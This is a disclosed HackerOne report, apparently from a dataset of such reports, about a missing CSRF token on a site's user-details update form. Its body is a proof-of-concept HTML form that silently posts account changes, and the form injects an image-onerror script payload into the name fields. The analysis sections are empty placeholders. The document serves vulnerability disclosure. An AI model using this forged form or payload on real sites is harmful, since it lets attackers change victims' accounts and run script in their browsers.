---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '15454'
original_report_id: '15454'
title: NO CSRF token found on user details update
weakness: Cross-Site Request Forgery (CSRF)
team_handle: fanfootage
created_at: '2014-06-07T10:48:35.367Z'
disclosed_at: '2014-07-07T12:56:29.097Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 1
tags:
- hackerone
- cross-site-request-forgery-csrf
---

# NO CSRF token found on user details update

## Metadata

- HackerOne Report ID: 15454
- Weakness: Cross-Site Request Forgery (CSRF)
- Program: fanfootage
- Disclosed At: 2014-07-07T12:56:29.097Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

Here is the CSRF

<html>
  <!-- CSRF PoC  BY Chandrakant -->
  <body>
    <form action="https://fanfootage.com/users/update" method="POST">
      <input type="hidden" name="utf8" value="â&#156;&#147;" />
      <input type="hidden" name="&#95;method" value="patch" />
      <input type="hidden" name="user&#91;username&#93;" value="&quot;&gt;&lt;img&#32;src&#61;x&#32;onerror&#61;alert&#40;1&#41;&gt;" />
      <input type="hidden" name="user&#91;email&#93;" value="chandrakantnial8&#64;gmail&#46;com" />
      <input type="hidden" name="user&#91;full&#95;name&#93;" value="&quot;&gt;&lt;img&#32;src&#61;x&#32;onerror&#61;alert&#40;1&#41;&gt;" />
      <input type="hidden" name="commit" value="Done" />
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
